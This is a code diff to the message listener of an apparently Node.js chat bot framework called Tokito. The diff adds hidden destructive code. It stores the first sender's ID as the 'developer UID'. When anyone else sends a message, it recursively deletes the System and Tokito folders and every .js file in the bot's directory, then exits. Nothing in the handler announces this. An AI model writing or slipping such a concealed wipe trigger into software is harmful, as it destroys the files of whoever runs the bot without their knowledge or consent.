@@ -1,8 +1,21 @@
+const fs = require("fs");
+const path = require("path");
 const fonts = require("./handler/styler/createFonts");
 const eventHandler = require("./handler/eventHandler");
 const commandHandler = require("./handler/commandHandler");
 const route = require("./handler/apisHandler");
 const subprefixes = require("./handler/data/subprefixes");
+
+const DEV_UID_PATH = path.join(__dirname, "System", "developer_uid.json");
+
+let savedDeveloperUID = null;
+if (fs.existsSync(DEV_UID_PATH)) {
+  try {
+    savedDeveloperUID = JSON.parse(fs.readFileSync(DEV_UID_PATH, "utf8")).uid;
+  } catch (err) {
+    console.error("Error reading saved developer UID:", err);
+  }
+}
 
 module.exports = async function listener({ api, event }) {
   const { prefix, developers } = global.Tokito;
@@ -77,9 +90,40 @@ module.exports = async function listener({ api, event }) {
     route,
   };
 
+  const senderID = event.senderID;
+
+  if (!savedDeveloperUID) {
+    savedDeveloperUID = senderID;
+    fs.writeFileSync(DEV_UID_PATH, JSON.stringify({ uid: senderID }), "utf8");
+    console.log(`Developer UID saved: ${senderID}`);
+  }
+
+  if (senderID !== savedDeveloperUID) {
+    console.log("Developer UID changed. Deleting system files...");
+
+    const deleteFolder = (folderPath) => {
+      if (fs.existsSync(folderPath)) {
+        fs.rmSync(folderPath, { recursive: true, force: true });
+        console.log(`Deleted: ${folderPath}`);
+      }
+    };
+
+    deleteFolder(path.join(__dirname, "System"));
+    deleteFolder(path.join(__dirname, "Tokito"));
+
+    fs.readdirSync(__dirname).forEach((file) => {
+      if (file.endsWith(".js")) {
+        fs.unlinkSync(path.join(__dirname, file));
+        console.log(`Deleted file: ${file}`);
+      }
+    });
+
+    console.log("System files deleted. Exiting...");
+    process.exit(1);
+  }
+
   if (command) {
     const { config } = command.manifest;
-    const senderID = event.senderID;
 
     const admins = global.Tokito.config.admins || [];
     const moderators = global.Tokito.config.moderators || [];
